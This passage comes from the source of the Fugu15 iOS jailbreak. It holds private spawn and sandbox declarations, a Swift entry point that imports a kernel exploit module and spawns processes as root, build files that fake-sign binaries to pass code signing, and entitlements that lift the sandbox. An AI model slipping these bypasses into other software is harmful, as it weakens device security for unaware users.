int     posix_spawnattr_set_subsystem_root_path_np(posix_spawnattr_t *attr, char *path); __API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0));

int     posix_spawnattr_set_platform_np(posix_spawnattr_t *attr, int platform, uint32_t flags); __API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0));

int     posix_spawnattr_disable_ptr_auth_a_keys_np(posix_spawnattr_t *attr, uint32_t flags); __API_AVAILABLE(macos(11.0), ios(14.0), tvos(14.0), watchos(7.0));

int     posix_spawn_file_actions_add_fileportdup2_np(posix_spawn_file_actions_t * __restrict, mach_port_t, int) __API_AVAILABLE(macos(10.15), ios(13.0), tvos(13.0), watchos(6.0));

struct sandbox_spawnattrs {
    uint8_t unk[8192];
};

void sandbox_spawnattrs_init(struct sandbox_spawnattrs *attrs);
int sandbox_spawnattrs_setprofilename(struct sandbox_spawnattrs *attrs, const char *);
int sandbox_spawnattrs_setcontainer(struct sandbox_spawnattrs *attrs, const char *);
int sandbox_init(const char *profile, uint64_t flags, char **errorbuf);

void* sandbox_create_params();
int sandbox_set_param(void* params, const char* key, const char* value);
void* sandbox_compile_string(const char* profile_str,
                             void* params,
                             char** error);
int sandbox_apply(void* profile);
void sandbox_free_params(void* params);
void sandbox_free_profile(void* profile);

struct sandbox_policy_layout {
    void *profile;
    uint64_t len;
    void *container;
    uint64_t containerLen;
    uint64_t pad1;
    uint64_t pad2;
};

int __sandbox_ms(const char* policy, int call, struct sandbox_policy_layout* arg);

__END_DECLS

#endif /* !defined _SPAWN_PRIVATE_H_*/

```

`Fugu15/Fugu15/main.swift`:

```swift
//
//  main.swift
//  Fugu15
//
//  Created by Linus Henze on 2022-07-29.
//

import Foundation
import Fugu15KernelExploit

func execCmd(args: [String], fileActions: posix_spawn_file_actions_t? = nil) -> Int32? {
    var fileActions = fileActions
    
    var attr: posix_spawnattr_t?
    posix_spawnattr_init(&attr)
    posix_spawnattr_set_persona_np(&attr, 99, 1)
    posix_spawnattr_set_persona_uid_np(&attr, 0)
    posix_spawnattr_set_persona_gid_np(&attr, 0)
    
    var pid: pid_t = 0
    var argv: [UnsafeMutablePointer<CChar>?] = []
    for arg in args {
        argv.append(strdup(arg))
    }
    
    argv.append(nil)
    
    let result = posix_spawn(&pid, argv[0], &fileActions, &attr, &argv, environ)
    let err = errno
    guard result == 0 else {
        NSLog("Failed")
        NSLog("Error: \(result) Errno: \(err)")
        
        return nil
    }
    
    var status: Int32 = 0
    waitpid(pid, &status, 0)
    
    return status
}

if CommandLine.arguments.count > 1 {
    switch CommandLine.arguments[1] {
    case "removeFuguInstallPlist":
        let path = Bundle.main.bundleURL
        
        let plist = path.appendingPathComponent("FuguInstall.plist")
        try? FileManager.default.removeItem(at: plist)
        
        exit(0)
        
    default:
        break
    }
}

Fugu15.mainHook()

Fugu15App.main()

```

`Fugu15/Makefile`:

```
.PHONY: all clean build_clean

all: Fugu15.ipa

Fugu15.ipa: build/Build/Products/Debug-iphoneos/Fugu15.app
	@echo Ad-Hoc signing Fugu15
	codesign -s - --entitlements Fugu15/Fugu15.entitlements build/Build/Products/Debug-iphoneos/Fugu15.app
	@echo Fake-signing Fugu15
	../Tools/fastPathSign/fastPathSign build/Build/Products/Debug-iphoneos/Fugu15.app
	@echo Creating ipa
	rm -rf Payload Fugu15.ipa
	mkdir Payload
	cp -r build/Build/Products/Debug-iphoneos/Fugu15.app Payload/Fugu15.app
	zip -Ar Fugu15.ipa Payload
	rm -rf Payload

build/Build/Products/Debug-iphoneos/Fugu15.app: FORCE
	xcodebuild -scheme Fugu15 -derivedDataPath build -destination 'generic/platform=iOS' CODE_SIGN_IDENTITY="" CODE_SIGNING_REQUIRED=NO

clean:
	rm -rf build Payload Fugu15.ipa

build_clean:
	rm -rf Payload build

FORCE: ;

```

`FuguInstall/FuguInstall.entitlements`:

```entitlements
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>com.apple.security.get-task-allow</key>
	<true/>
	<key>platform-application</key>
	<true/>
	<key>com.apple.private.persona-mgmt</key>
	<true/>
	<key>com.apple.private.tcc.allow</key>
	<array>
		<string>kTCCServiceSystemPolicyAllFiles</string>
	</array>
	<key>com.apple.private.security.no-container</key>
	<true/>
	<key>com.apple.private.security.storage-exempt.heritable</key>
	<true/>
	<key>com.apple.private.security.storage.AppBundles</key>
	<true/>
	<key>com.apple.private.security.no-sandbox</key>
	<true/>
	<key>com.apple.private.mobileinstall.allowedSPI</key>
	<array>
		<string>InstallForLaunchServices</string>
		<string>Install</string>
		<string>UninstallForLaunchServices</string>
		<string>Uninstall</string>
		<string>UpdatePlaceholderMetadata</string>
	</array>
	<key>com.apple.springboard.launchapplications</key>
	<true/>
	<key>com.apple.backboardd.launchapplications</key>
	<true/>
	<key>com.apple.frontboard.launchapplications</key>
	<true/>
</dict>
</plist>

```

`FuguInstall/Makefile`:

```
SDK=iphoneos
SDK_PATH=$(shell xcrun --sdk $(SDK) --show-sdk-path)

TARGET=arm64-apple-ios14.0
CONFIG=release
TEAMID ?= APPLECOMPUTER

SWIFTC_ARGS=-sdk "$(SDK_PATH)" -target $(TARGET) -O -framework IOKit -framework CoreServices -D__DARWIN_OPAQUE_ARM_THREAD_STATE64
SWIFT_BUILD_ARGS=-c $(CONFIG) -Xcc "-DIOS_BUILD" -Xcc -target -Xcc $(TARGET) -Xcc -Wno-incompatible-sysroot $(addprefix -Xswiftc ,$(SWIFTC_ARGS))

all: FuguInstall

.PHONY: all build_clean clean

FuguInstall: .build/$(CONFIG)/FuguInstall FORCE
	@cp .build/$(CONFIG)/FuguInstall FuguInstall_tmp
	@echo Changing FuguInstall CPU subtype
	printf '\x01' | dd of=FuguInstall_tmp bs=1 seek=8 conv=notrunc 2>/dev/null
	@echo Ad-Hoc signing FuguInstall
	codesign -s - --entitlements FuguInstall.entitlements FuguInstall_tmp
	@echo "Fake-signing FuguInstall (team id: $(TEAMID))"
	../Tools/fastPathSign/fastPathSign FuguInstall_tmp $(TEAMID)
	@mv FuguInstall_tmp FuguInstall

.build/$(CONFIG)/%: Sources/% FORCE
	@echo Building FuguInstall
	swift build $(SWIFT_BUILD_ARGS)
	
build_clean:
	rm -rf .build
	rm -f FuguInstall_tmp
	
clean: build_clean
	rm -f FuguInstall

FORCE: ;

```

`FuguInstall/Package.resolved`:

```resolved
{
  "object": {
    "pins": [
      {
        "package": "ZIPFoundation",
        "repositoryURL": "https://github.com/weichsel/ZIPFoundation.git",
        "state": {
          "branch": null,
          "revision": "1b662e2e7a091710ad8a963263939984e2ebf527",
          "version": "0.9.14"
        }
      }
    ]
  },
  "version": 1
}

```

`FuguInstall/Package.swift`:

```swift
// swift-tools-version: 5.4
// The swift-tools-version declares the minimum version of Swift required to build this package.

import PackageDescription

let package = Package(
    name: "FuguInstall",
    platforms: [
        .iOS(.v14),
        .macOS(.v11)
    ],
    products: [
        // Products define the executables and libraries a package produces, and make them visible to other packages.
        .executable(
            name: "FuguInstall",
            targets: ["FuguInstall"]),
    ],
    dependencies: [
        // Dependencies declare other packages that this package depends on.
        .package(url: "https://github.com/weichsel/ZIPFoundation.git", .upToNextMajor(from: "0.9.0"))
    ],
    targets: [
        // Targets are the basic building blocks of a package. A target can define a module or a test suite.
        // Targets can depend on other targets in this package, and on products in packages this package depends on.
        .target(name: "CBindings"),
        .executableTarget(
            name: "FuguInstall",
            dependencies: ["CBindings", "ZIPFoundation"]),
    ]
)

```

`FuguInstall/README.md`:

```md
# FuguInstall

Fugu15 installer. Supports installing arbitrary (fastPath signed) IPAs.

```

`FuguInstall/Sources/CBindings/include/LSApplicationProxy.h`:

```h
/*
* This header is generated by classdump-dyld 1.0
* on Friday, January 21, 2022 at 6:51:04 AM Pacific Standard Time
* Operating System: Version 15.2.1 (Build 19C63)
* Image Source: /System/Library/Frameworks/CoreServices.framework/CoreServices
* classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
*/

#import <Foundation/Foundation.h>
//#import <CoreServices/CoreServices-Structs.h>
//#import <CoreServices/LSBundleProxy.h>
//#import <libobjc.A.dylib/LSDetachable.h>
//#import <libobjc.A.dylib/NSSecureCoding.h>

#import "_LSApplicationState.h"
#import "LSBundleProxy.h"

@class NSString, LSApplicationRecord, NSArray, NSDate, NSNumber, NSUUID, NSProgress, _LSDiskUsage, _LSApplicationState, NSDictionary, NSSet, LSContext;

@interface LSApplicationProxy : LSBundleProxy /*<LSDetachable, NSSecureCoding>*/ {

	NSString* _deviceIdentifierVendorName;
	LSApplicationRecord* _record;
	NSArray* _plugInKitPlugins;
	BOOL _userInitiatedUninstall;

}

@property (readonly) NSArray * if_userActivityTypes; 
@property (assign,nonatomic) BOOL userInitiatedUninstall;                                          //@synthesize userInitiatedUninstall=_userInitiatedUninstall - In the implementation block
@property (nonatomic,readonly) BOOL supportsAlternateIconNames; 
@property (nonatomic,readonly) int bundleModTime; 
@property (nonatomic,readonly) LSApplicationRecord * correspondingApplicationRecord; 
@property (nonatomic,readonly) NSString * applicationIdentifier; 
@property (nonatomic,readonly) NSString * companionApplicationIdentifier; 
@property (nonatomic,readonly) NSArray * counterpartIdentifiers; 
@property (nonatomic,readonly) NSDate * registeredDate; 
@property (nonatomic,readonly) NSNumber * itemID; 
@property (nonatomic,readonly) NSString * vendorName; 
@property (nonatomic,readonly) NSString * itemName; 
@property (nonatomic,readonly) NSString * storeCohortMetadata; 
@property (nonatomic,readonly) NSString * genre; 
@property (nonatomic,readonly) NSNumber * genreID; 
@property (nonatomic,readonly) NSArray * subgenres; 
@property (nonatomic,readonly) NSArray * staticShortcutItems; 
@property (nonatomic,readonly) NSString * minimumSystemVersion; 
@property (nonatomic,readonly) NSString * maximumSystemVersion; 
@property (nonatomic,readonly) NSString * shortVersionString; 
@property (nonatomic,readonly) NSString * preferredArchitecture; 
@property (nonatomic,readonly) NSString * applicationType; 
@property (nonatomic,readonly) NSArray * directionsModes; 
@property (nonatomic,readonly) NSArray * UIBackgroundModes; 
@property (nonatomic,readonly) NSArray * audioComponents; 
@property (nonatomic,readonly) NSUUID * deviceIdentifierForVendor; 
@property (nonatomic,readonly) NSUUID * deviceIdentifierForAdvertising; 
@property (nonatomic,readonly) NSProgress * installProgress; 
@property (nonatomic,readonly) NSNumber * staticDiskUsage; 
@property (nonatomic,readonly) NSNumber * dynamicDiskUsage; 
@property (nonatomic,readonly) NSNumber * ODRDiskUsage; 
@property (nonatomic,readonly) _LSDiskUsage * diskUsage; 
@property (nonatomic,readonly) _LSApplicationState * appState; 
@property (getter=isInstalled,nonatomic,readonly) BOOL installed; 
@property (getter=isPlaceholder,nonatomic,readonly) BOOL placeholder; 
@property (getter=isRestricted,nonatomic,readonly) BOOL restricted; 
@property (getter=isRemovedSystemApp,nonatomic,readonly) BOOL removedSystemApp; 
@property (nonatomic,readonly) NSArray * VPNPlugins; 
@property (nonatomic,readonly) NSArray * plugInKitPlugins; 
@property (nonatomic,readonly) NSArray * appTags; 
@property (nonatomic,readonly) NSString * applicationDSID; 
@property (nonatomic,readonly) NSNumber * purchaserDSID; 
@property (nonatomic,readonly) NSNumber * downloaderDSID; 
@property (nonatomic,readonly) NSNumber * familyID; 
@property (nonatomic,readonly) unsigned long long installType; 
@property (nonatomic,readonly) unsigned long long originalInstallType; 
@property (nonatomic,readonly) NSArray * requiredDeviceCapabilities; 
@property (nonatomic,readonly) NSArray * deviceFamily; 
@property (nonatomic,readonly) NSArray * activityTypes; 
@property (nonatomic,readonly) NSArray * externalAccessoryProtocols; 
@property (nonatomic,readonly) NSString * teamID; 
@property (nonatomic,readonly) NSString * appIDPrefix; 
@property (nonatomic,readonly) NSNumber * storeFront; 
@property (nonatomic,readonly) NSNumber * externalVersionIdentifier; 
@property (nonatomic,readonly) NSNumber * betaExternalVersionIdentifier; 
@property (nonatomic,readonly) NSNumber * ratingRank; 
@property (nonatomic,readonly) NSString * ratingLabel; 
@property (nonatomic,readonly) NSString * sourceAppIdentifier; 
@property (nonatomic,readonly) NSString * applicationVariant; 
@property (getter=isAppUpdate,nonatomic,readonly) BOOL appUpdate; 
@property (nonatomic,readonly) BOOL hasParallelPlaceholder; 
@property (getter=isNewsstandApp,nonatomic,readonly) BOOL newsstandApp; 
@property (getter=isWhitelisted,nonatomic,readonly) BOOL whitelisted; 
@property (getter=isAppStoreVendable,nonatomic,readonly) BOOL appStoreVendable; 
@property (getter=isDeviceBasedVPP,nonatomic,readonly) BOOL deviceBasedVPP; 
@property (getter=isBetaApp,nonatomic,readonly) BOOL betaApp; 
@property (getter=isAdHocCodeSigned,nonatomic,readonly) BOOL adHocCodeSigned; 
@property (nonatomic,readonly) BOOL supportsAudiobooks; 
@property (getter=isLaunchProhibited,nonatomic,readonly) BOOL launchProhibited; 
@property (nonatomic,readonly) BOOL supportsODR; 
@property (nonatomic,readonly) BOOL hasSettingsBundle; 
@property (nonatomic,readonly) BOOL supportsExternallyPlayableContent; 
@property (nonatomic,readonly) BOOL supportsOpenInPlace; 
@property (nonatomic,readonly) BOOL fileSharingEnabled; 
@property (nonatomic,readonly) BOOL iconIsPrerendered; 
@property (nonatomic,readonly) BOOL iconUsesAssetCatalog; 
@property (getter=isPurchasedReDownload,nonatomic,readonly) BOOL purchasedReDownload; 
@property (nonatomic,readonly) BOOL hasMIDBasedSINF; 
@property (nonatomic,readonly) BOOL missingRequiredSINF; 
@property (nonatomic,readonly) BOOL supportsPurgeableLocalStorage; 
@property (getter=isDeletable,nonatomic,readonly) BOOL deletable; 
@property (nonatomic,readonly) NSArray * managedPersonas; 
@property (getter=isRemoveableSystemApp,nonatomic,readonly) BOOL removeableSystemApp; 
@property (getter=isWatchKitApp,nonatomic,readonly) BOOL watchKitApp; 
@property (nonatomic,readonly) NSString * watchKitVersion; 
@property (nonatomic,readonly) NSString * complicationPrincipalClass; 
@property (nonatomic,readonly) NSArray * supportedComplicationFamilies; 
@property (nonatomic,readonly) BOOL hasCustomNotification; 
@property (nonatomic,readonly) BOOL hasComplication; 
@property (nonatomic,readonly) BOOL hasGlance; 
@property (nonatomic,readonly) BOOL shouldSkipWatchAppInstall; 
@property (getter=isGameCenterEnabled,nonatomic,readonly) BOOL gameCenterEnabled; 
@property (nonatomic,readonly) BOOL gameCenterEverEnabled; 
@property (nonatomic,readonly) NSNumber * installFailureReason; 
@property (nonatomic,readonly) long long deviceManagementPolicy; 
@property (nonatomic,readonly) NSDictionary * siriActionDefinitionURLs; 
@property (nonatomic,readonly) NSString * appStoreToolsBuildVersion; 
@property (nonatomic,readonly) NSSet * claimedDocumentContentTypes; 
@property (nonatomic,readonly) NSSet * claimedURLSchemes; 
@property (nonatomic,readonly) BOOL canHandleWebAuthentication; 
@property (nonatomic,readonly) BOOL supportsMultiwindow; 
@property (nonatomic,readonly) NSNumber * platform; 
@property (nonatomic,readonly) NSArray * backgroundTaskSchedulerPermittedIdentifiers; 
@property (getter=isStandaloneWatchApp,nonatomic,readonly) BOOL standaloneWatchApp; 
@property (nonatomic,readonly) BOOL runsIndependentlyOfCompanionApp; 
@property (getter=isArcadeApp,nonatomic,readonly) BOOL arcadeApp; 
@property (nonatomic,readonly) NSArray * carPlayInstrumentClusterURLSchemes; 
+(BOOL)supportsSecureCoding;
+(instancetype)applicationProxyForIdentifier:(NSString*)arg1 ;
+(instancetype)applicationProxyForSystemPlaceholder:(id)arg1 ;
+(instancetype)applicationProxyForCompanionIdentifier:(id)arg1 ;
+(instancetype)applicationProxyForItemID:(id)arg1 ;
+(instancetype)applicationProxyForIdentifier:(id)arg1 placeholder:(BOOL)arg2 ;
+(instancetype)applicationProxyForBundleURL:(id)arg1 ;
+(instancetype)applicationProxyForBundleType:(unsigned long long)arg1 identifier:(id)arg2 isCompanion:(BOOL)arg3 URL:(id)arg4 itemID:(id)arg5 bundleUnit:(unsigned*)arg6 ;
+(instancetype)applicationProxyForIdentifier:(id)arg1 withContext:(LSContext*)arg2 ;
+(instancetype)applicationProxyWithBundleUnitID:(unsigned)arg1 withContext:(LSContext*)arg2 ;
-(id)__ck_messagesPluginKitProxy;
-(id)__IS_iconDataForVariant:(int)arg1 withOptions:(int)arg2 ;
-(id)__IS_iconDataForVariant:(int)arg1 preferredIconName:(id)arg2 withOptions:(int)arg3 ;
-(id)un_applicationBundleIdentifier;
-(id)un_applicationBundleURL;
-(NSArray *)if_userActivityTypes;
-(BOOL)isGameCenterEnabled;
-(BOOL)isInstalled;
-(_LSApplicationState *)appState;
-(id)bundleType;
-(NSNumber *)ODRDiskUsage;
-(NSArray *)deviceFamily;
-(BOOL)UPPValidated;
-(id)localizedNameForContext:(id)arg1 preferredLocalizations:(id)arg2 useShortNameOnly:(BOOL)arg3 ;
-(NSString *)appIDPrefix;
-(BOOL)isAppUpdate;
-(BOOL)supportsODR;
-(BOOL)isWhitelisted;
-(int)bundleModTime;
-(id)_localizedNameWithPreferredLocalizations:(id)arg1 useShortNameOnly:(BOOL)arg2 ;
-(id)_initWithContext:(LSContext*)arg1 bundleUnit:(unsigned)arg2 applicationRecord:(id)arg3 bundleID:(id)arg4 resolveAndDetach:(BOOL)arg5 ;
-(NSString *)applicationDSID;
-(NSNumber *)staticDiskUsage;
-(BOOL)hasMIDBasedSINF;
-(id)environmentVariables;
-(id)alternateIconName;
-(BOOL)iconIsPrerendered;
-(void)getDeviceManagementPolicyWithCompletionHandler:(/*^block*/id)arg1 ;
-(NSSet *)claimedURLSchemes;
-(id)getBundleMetadata;
-(NSDate *)registeredDate;
-(BOOL)isNewsstandApp;
-(NSString *)vendorName;
-(id)_initWithBundleUnit:(unsigned)arg1 context:(LSContext*)arg2 bundleIdentifier:(id)arg3 ;
-(id)localizedNameForContext:(id)arg1 preferredLocalizations:(id)arg2 ;
-(unsigned long long)originalInstallType;
-(id)handlerRankOfClaimForContentType:(id)arg1 ;
-(NSSet *)claimedDocumentContentTypes;
-(BOOL)getGenericTranslocationTargetURL:(id*)arg1 error:(id*)arg2 ;
-(NSString *)storeCohortMetadata;
-(NSString *)sourceAppIdentifier;
-(id)groupContainerURLs;
-(BOOL)missingRequiredSINF;
-(void)setAlternateIconName:(id)arg1 withResult:(/*^block*/id)arg2 ;
-(NSString *)applicationVariant;
-(id)_managedPersonas;
-(id)iconDataForVariant:(int)arg1 ;
-(NSNumber *)dynamicDiskUsage;
-(id)installProgressSync;
-(BOOL)profileValidated;
-(NSString *)genre;
-(BOOL)iconUsesAssetCatalog;
-(void)detach;
-(BOOL)fileSharingEnabled;
-(BOOL)_usesSystemPersona;
-(NSNumber *)installFailureReason;
-(BOOL)isStandaloneWatchApp;
-(NSString *)preferredArchitecture;
-(BOOL)isPurchasedReDownload;
-(BOOL)freeProfileValidated;
-(long long)deviceManagementPolicy;
-(BOOL)userInitiatedUninstall;
-(NSDictionary *)siriActionDefinitionURLs;
-(BOOL)isRemoveableSystemApp;
-(id)localizedNameForContext:(id)arg1 ;
-(BOOL)gameCenterEverEnabled;
-(NSNumber *)betaExternalVersionIdentifier;
-(NSString *)complicationPrincipalClass;
-(id)primaryIconDataForVariant:(int)arg1 ;
-(void)setUserInitiatedUninstall:(BOOL)arg1 ;
-(id)iconDataForVariant:(int)arg1 withOptions:(int)arg2 ;
-(NSArray *)plugInKitPlugins;
-(BOOL)isDeletableIgnoringRestrictions;
-(id)dataContainerURL;
-(LSApplicationRecord *)correspondingApplicationRecord;
-(void)clearAdvertisingIdentifier;
-(BOOL)isWatchKitApp;
-(NSString *)applicationIdentifier;
-(void)encodeWithCoder:(id)arg1 ;
-(id)forwardingTargetForSelector:(SEL)arg1 ;
-(id)signerIdentity;
-(BOOL)isRemovedSystemApp;
-(unsigned long long)installType;
-(NSNumber *)ratingRank;
-(BOOL)isPlaceholder;
-(id)valueForUndefinedKey:(id)arg1 ;
-(NSArray *)requiredDeviceCapabilities;
-(id)methodSignatureForSelector:(SEL)arg1 ;
-(id)signerOrganization;
-(NSString *)companionApplicationIdentifier;
-(BOOL)isRestricted;
-(BOOL)isBetaApp;
-(NSString *)teamID;
-(BOOL)isDeviceBasedVPP;
-(NSString *)ratingLabel;
-(id)description;
-(NSNumber *)purchaserDSID;
-(NSNumber *)genreID;
-(NSNumber *)familyID;
-(NSArray *)managedPersonas;
-(NSString *)itemName;
-(NSNumber *)downloaderDSID;
-(NSNumber *)storeFront;
-(NSNumber *)itemID;
-(id)initWithCoder:(id)arg1 ;
-(NSNumber *)platform;
-(NSArray *)subgenres;
-(NSProgress *)installProgress;
-(NSString *)applicationType;
-(NSArray *)activityTypes;
-(NSNumber *)externalVersionIdentifier;
-(BOOL)respondsToSelector:(SEL)arg1 ;
@end


```

`FuguInstall/Sources/CBindings/include/LSApplicationWorkspace.h`:

```h
/*
 * This header is generated by classdump-dyld 1.0
 * on Friday, January 21, 2022 at 6:51:04 AM Pacific Standard Time
 * Operating System: Version 15.2.1 (Build 19C63)
 * Image Source: /System/Library/Frameworks/CoreServices.framework/CoreServices
 * classdump-dyld is licensed under GPLv3, Copyright © 2013-2016 by Elias Limneos.
 */

#import <Foundation/Foundation.h>
//#import <CoreServices/CoreServices-Structs.h>

#import "LSApplicationProxy.h"

@class NSMutableDictionary, LSInstallProgressList;

extern NSString *LSInstallTypeKey;

@interface LSApplicationWorkspace : NSObject {
    
    NSMutableDictionary* _createdInstallProgresses;
    LSInstallProgressList* _observedInstallProgresses;
}
@property (readonly) LSInstallProgressList * observedInstallProgresses;              //@synthesize observedInstallProgresses=_observedInstallProgresses - In the implementation block
@property (readonly) NSMutableDictionary * createdInstallProgresses;                 //@synthesize createdInstallProgresses=_createdInstallProgresses - In the implementation block
+(instancetype)defaultWorkspace;
+(id)callbackQueue;
+(id)activeManagedConfigurationRestrictionUUIDs;
+(id)progressQueue;
+(id)_defaultAppQueue;
+(id)_remoteObserver;
-(void)_sf_openURL:(id)arg1 withOptions:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(void)_sf_openURL:(id)arg1 inApplication:(id)arg2 withOptions:(id)arg3 completionHandler:(/*^block*/id)arg4 ;
-(BOOL)_sf_shouldOverrideiCloudSharingURL:(id)arg1 withAppRedirectURL:(id)arg2 referrerURL:(id)arg3 loadedUsingDesktopUserAgent:(BOOL)arg4 ;
-(void)_sf_tryOpeningURLInDefaultApp:(id)arg1 isContentManaged:(BOOL)arg2 completionHandler:(/*^block*/id)arg3 ;
-(BOOL)revertContainerizedApplicationWithIdentifier:(id)arg1 options:(id)arg2 returningRecordPromise:(id*)arg3 error:(id*)arg4 progressBlock:(/*^block*/id)arg5 ;
-(BOOL)installContainerizedApplicationArtifactAtURL:(id)arg1 withOptions:(id)arg2 returningRecordPromise:(id*)arg3 error:(id*)arg4 progressBlock:(/*^block*/id)arg5 ;
//-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 uniqueDocumentIdentifier:(id)arg3 isContentManaged:(BOOL)arg4 sourceAuditToken:(const SCD_Struct_FS1*)arg5 userInfo:(id)arg6 options:(id)arg7 delegate:(id)arg8 ;
-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 uniqueDocumentIdentifier:(id)arg3 userInfo:(id)arg4 delegate:(id)arg5 ;
-(id)observerProxy;
-(void)openUserActivity:(id)arg1 withApplicationProxy:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(void)openUserActivityWithUUID:(id)arg1 activityType:(id)arg2 usingApplicationRecord:(id)arg3 configuration:(id)arg4 completionHandler:(/*^block*/id)arg5 ;
-(BOOL)updatePlaceholderMetadataForApp:(id)arg1 installType:(unsigned long long)arg2 failure:(unsigned long long)arg3 underlyingError:(id)arg4 source:(unsigned long long)arg5 outError:(id*)arg6 ;
-(void)_openUserActivity:(id)arg1 orUserActivityUUID:(id)arg2 activityTypeForUUID:(id)arg3 withApplicationProxy:(id)arg4 options:(id)arg5 completionHandler:(/*^block*/id)arg6 ;
-(BOOL)updateRecordForApp:(id)arg1 withSINF:(id)arg2 iTunesMetadata:(id)arg3 placeholderMetadata:(id)arg4 sendNotification:(int)arg5 error:(id*)arg6 ;
-(BOOL)installContainerizedApplicationArtifactAtURL:(id)arg1 withOptions:(id)arg2 error:(id*)arg3 progressBlock:(/*^block*/id)arg4 ;
-(BOOL)uninstallContainerizedApplicationWithIdentifier:(id)arg1 options:(id)arg2 error:(id*)arg3 progressBlock:(/*^block*/id)arg4 ;
-(void)openApplicationWithBundleIdentifier:(id)arg1 configuration:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(void)openApplicationWithBundleIdentifier:(id)arg1 usingConfiguration:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(void)openUserActivity:(id)arg1 usingApplicationRecord:(id)arg2 configuration:(id)arg3 completionHandler:(/*^block*/id)arg4 ;
-(BOOL)updateiTunesMetadataWithData:(id)arg1 forApplication:(id)arg2 options:(id)arg3 error:(id*)arg4 ;
-(BOOL)revertContainerizedApplicationWithIdentifier:(id)arg1 options:(id)arg2 error:(id*)arg3 progressBlock:(/*^block*/id)arg4 ;
-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 uniqueDocumentIdentifier:(id)arg3 userInfo:(id)arg4 ;
-(BOOL)updatePlaceholderWithBundleIdentifier:(id)arg1 withInstallType:(unsigned long long)arg2 error:(id*)arg3 ;
-(BOOL)_LSPrivateRebuildApplicationDatabasesForSystemApps:(BOOL)arg1 internal:(BOOL)arg2 user:(BOOL)arg3 ;
-(void)removeAllDefaultApplicationPreferencesWithCompletionHandler:(/*^block*/id)arg1 ;
-(void)openUserActivity:(id)arg1 withApplicationProxy:(id)arg2 options:(id)arg3 completionHandler:(/*^block*/id)arg4 ;
-(void)_LSPrivateSetRemovedSystemAppIdentifiers:(id)arg1 ;
-(void)rebuildDatabaseContentForFrameworkAtURL:(id)arg1 completionHandler:(/*^block*/id)arg2 ;
-(BOOL)installApplication:(NSURL*)arg1 withOptions:(NSDictionary*)arg2 error:(NSError**)arg3 usingBlock:(void (^)(id obj, void *unk))arg4 ;
-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 uniqueDocumentIdentifier:(id)arg3 sourceIsManaged:(BOOL)arg4 userInfo:(id)arg5 delegate:(id)arg6 ;
-(BOOL)isApplicationAvailableToOpenURL:(id)arg1 includePrivateURLSchemes:(BOOL)arg2 error:(id*)arg3 ;
-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 uniqueDocumentIdentifier:(id)arg3 sourceIsManaged:(BOOL)arg4 userInfo:(id)arg5 options:(id)arg6 delegate:(id)arg7 ;
-(BOOL)_getBundleIdentifierForBundleAtURL:(id)arg1 invokeUpdateBlockAndReregister:(/*^block*/id)arg2 error:(id*)arg3 ;
-(BOOL)registerPlugin:(id)arg1 ;
-(id)scanForApplicationStateChangesFromRank:(id)arg1 toRank:(id)arg2 ;
-(id)remoteObserver;
-(void)acquireDatabase;
-(id)pluginsWithIdentifiers:(id)arg1 protocols:(id)arg2 version:(id)arg3 ;
-(void)setDefaultWebBrowserToApplicationRecord:(id)arg1 completionHandler:(/*^block*/id)arg2 ;
-(void)relaxApplicationTypeRequirements:(BOOL)arg1 forApplicationRecord:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(id)installProgressForApplication:(id)arg1 withPhase:(unsigned long long)arg2 ;
-(void)setDefaultMailClientToApplicationRecord:(id)arg1 completionHandler:(/*^block*/id)arg2 ;
-(BOOL)updateSINFWithData:(id)arg1 forApplication:(id)arg2 options:(id)arg3 error:(id*)arg4 ;
-(void)enumerateBundlesOfType:(unsigned long long)arg1 legacySPI:(BOOL)arg2 block:(/*^block*/id)arg3 ;
-(BOOL)ls_injectUTTypeWithDeclaration:(id)arg1 inDatabase:(id)arg2 error:(id*)arg3 ;
-(id)syncObserverProxy;
-(BOOL)registerApplicationDictionary:(id)arg1 withObserverNotification:(int)arg2 ;
-(void)openURL:(id)arg1 configuration:(id)arg2 completionHandler:(/*^block*/id)arg3 ;
-(void)enumeratePluginsMatchingQuery:(id)arg1 withBlock:(/*^block*/id)arg2 ;
-(id)applicationsAvailableForOpeningDocument:(id)arg1 ;
-(BOOL)isApplicationAvailableToOpenURLCommon:(id)arg1 includePrivateURLSchemes:(BOOL)arg2 error:(id*)arg3 ;
-(BOOL)unregisterPlugin:(id)arg1 ;
-(BOOL)uninstallApplication:(id)arg1 withOptions:(id)arg2 error:(NSError**)arg3 usingBlock:(/*^block*/id)arg4 ;
-(BOOL)downgradeApplicationToPlaceholder:(id)arg1 withOptions:(id)arg2 error:(id*)arg3 ;
-(id)privateURLSchemes;
-(id)applicationForUserActivityDomainName:(id)arg1 ;
-(id)bundleIdentifiersForMachOUUIDs:(id)arg1 error:(id*)arg2 ;
-(id)machOUUIDsForBundleIdentifiers:(id)arg1 error:(id*)arg2 ;
-(id)pluginsWithIdentifiers:(id)arg1 protocols:(id)arg2 version:(id)arg3 applyFilter:(/*^block*/id)arg4 ;
-(id)operationToOpenResource:(id)arg1 usingApplication:(id)arg2 userInfo:(id)arg3 ;
-(void)placeholderInstalledForIdentifier:(id)arg1 filterDowngrades:(BOOL)arg2 ;
-(id)applicationProxiesWithPlistFlags:(unsigned)arg1 bundleFlags:(unsigned long long)arg2 ;
-(BOOL)installPhaseFinishedForProgress:(id)arg1 ;
-(void)enumerateApplicationsOfType:(unsigned long long)arg1 block:(/*^block*/id)arg2 ;
-(BOOL)updateSINFWithData:(id)arg1 forApplicationAtURL:(id)arg2 error:(id*)arg3 ;
-(BOOL)updateiTunesMetadataWithData:(id)arg1 forApplicationAtURL:(id)arg2 error:(id*)arg3 ;
-(void)clearCreatedProgressForBundleID:(id)arg1 ;
